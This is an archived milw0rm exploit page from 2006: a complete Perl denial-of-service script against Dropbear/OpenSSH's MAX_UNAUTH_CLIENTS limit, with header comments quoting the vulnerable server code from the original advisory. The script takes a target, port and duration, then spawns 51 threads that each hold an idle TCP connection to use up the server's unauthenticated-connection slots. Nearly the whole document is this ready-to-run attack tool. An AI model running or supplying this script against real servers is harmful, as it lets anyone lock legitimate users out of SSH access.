<html><head><title>Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service</title></head><pre>#!/usr/bin/perl
## I needed a working test script so here it is.
## just a keep alive thread, I had a few problems with Pablo's code running properly.
##
## Straight from Pablo Fernandez's advisory:
# Vulnerable code is in svr-main.c
#
# /* check for max number of connections not authorised */
# for (j = 0; j &lt; MAX_UNAUTH_CLIENTS; j++) {
#        if (childpipes[j] &lt; 0) {
#                break;
#        }
# }
#
# if (j == MAX_UNAUTH_CLIENTS) {
#        /* no free connections */
#        /* TODO - possibly log, though this would be an easy way
#         * to fill logs/disk */
#        close(childsock);
#        continue;
# }
## /str0ke (milw0rm.com)

use IO::Socket;
use Thread;
use strict;

# thanks to Perl Underground for my moronic coding style fixes.
my ($serv, $port, $time) = @ARGV;

sub usage
{
	print &quot;\nDropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service Exploit\n&quot;;
	print &quot;by /str0ke (milw0rm.com)\n&quot;;
	print &quot;Credits to Pablo Fernandez\n&quot;;
	print &quot;Usage: $0 [Target Domain] [Target Port] [Seconds to hold attack]\n&quot;;
	exit ();
}

sub exploit
{
	my ($serv, $port, $sleep) = @_;
	my $sock = new IO::Socket::INET ( PeerAddr =&gt; $serv,
	PeerPort =&gt; $port,
	Proto =&gt; 'tcp',
	);

	die &quot;Could not create socket: $!\n&quot; unless $sock;
	sleep $sleep;
	close($sock);
}

sub thread {
	print &quot;Server: $serv\nPort: $port\nSeconds: $time\n&quot;;
	for my $i ( 1 .. 51 ) {
		print &quot;.&quot;;
		my $thr = new Thread \&amp;exploit, $serv, $port, $time;
	}
	sleep $time; #detach wouldn't be good
}

if (@ARGV != 3){&amp;usage;}else{&amp;thread;}

# milw0rm.com [2006-03-10]</pre></html>